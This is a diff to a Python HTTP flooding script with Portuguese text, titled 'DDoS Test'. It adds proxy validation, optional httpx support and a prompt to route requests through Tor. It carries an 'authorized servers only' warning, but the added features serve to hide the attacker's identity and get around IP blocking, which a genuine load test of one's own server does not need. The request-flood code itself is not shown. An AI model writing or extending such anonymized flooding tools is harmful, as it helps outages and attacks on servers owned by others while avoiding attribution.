@@ -7,6 +7,11 @@ from urllib.parse import urlparse
 import signal
 from datetime import datetime
 import random
+try:
+    import httpx
+    HTTPX_AVAILABLE = True
+except ImportError:
+    HTTPX_AVAILABLE = False
 
 # Configurações globais
 REQUEST_COUNT = 0  # Contador de requisições
@@ -140,15 +145,27 @@ def print_report():
     print(f"\033[94m{'='*50}\033[0m")
 
 def display_menu():
-    """Exibe o menu interativo."""
-    print("\033[96m" + "="*50 + "\033[0m")
-    print("\033[96m         DDoS Test - Script de Teste de Estresse         \033[0m")
+    print("\033[96m" + "="*60 + "\033[0m")
+    print("\033[96m        DDoS Test - Script de Teste de Estresse HTTP         \033[0m")
     print("\033[93mAVISO: Use APENAS em servidores próprios ou com autorização!\033[0m")
-    print("\033[96m" + "="*50 + "\033[0m")
-    print("1. Configurar e iniciar teste")
-    print("2. Alterar método HTTP (GET/POST)")
-    print("3. Sair")
-    print("\033[96m" + "="*50 + "\033[0m")
+    print("\033[96m" + "="*60 + "\033[0m")
+    print("\033[92m1. Configurar e iniciar teste\033[0m")
+    print("\033[94m2. Alterar método HTTP (GET/POST)\033[0m")
+    print("\033[91m3. Sair\033[0m")
+    print("\033[96m" + "="*60 + "\033[0m")
+    print("\033[93mSugestão: Para máxima segurança, utilize proxies confiáveis ou Tor.\033[0m")
+    if HTTPX_AVAILABLE:
+        print("\033[92mBiblioteca httpx disponível para maior performance.\033[0m")
+    else:
+        print("\033[91mhttpx não instalado. Usando requests. Para instalar: pip install httpx\033[0m")
+
+def validate_proxy(proxy):
+    try:
+        test_url = "http://httpbin.org/ip"
+        resp = requests.get(test_url, proxies=proxy, timeout=5)
+        return resp.status_code == 200
+    except Exception:
+        return False
 
 def main():
     config = {
@@ -158,7 +175,8 @@ def main():
         "method": "GET",
         "post_data": None,
         "proxies_list": [],
-        "verify_ssl": False
+        "verify_ssl": False,
+        "use_tor": False
     }
 
     while True:
@@ -186,15 +204,22 @@ def main():
                     proxy_input = input().strip()
                     if not proxy_input:
                         break
-                    if proxy_input.startswith("http"):
-                        proxies_list.append({"http": proxy_input, "https": proxy_input})
-                    elif proxy_input.startswith("socks5"):
-                        proxies_list.append({"http": proxy_input, "https": proxy_input})
+                    if proxy_input.startswith("http") or proxy_input.startswith("socks5"):
+                        proxy_dict = {"http": proxy_input, "https": proxy_input}
+                        print("Testando proxy...", end=" ")
+                        if validate_proxy(proxy_dict):
+                            print("\033[92mOK\033[0m")
+                            proxies_list.append(proxy_dict)
+                        else:
+                            print("\033[91mFALHOU\033[0m")
                     else:
                         print("\033[91mProxy inválido, use http://ip:porta ou socks5://ip:porta\033[0m")
                 config["proxies_list"] = proxies_list
             else:
                 config["proxies_list"] = []
+
+            use_tor = input("Deseja usar Tor para anonimato extra? (s/n): ").strip().lower()
+            config["use_tor"] = (use_tor == "s")
 
             verify_ssl = input("Ignorar verificação SSL? (s/n): ").strip().lower()
             config["verify_ssl"] = (verify_ssl == "n")
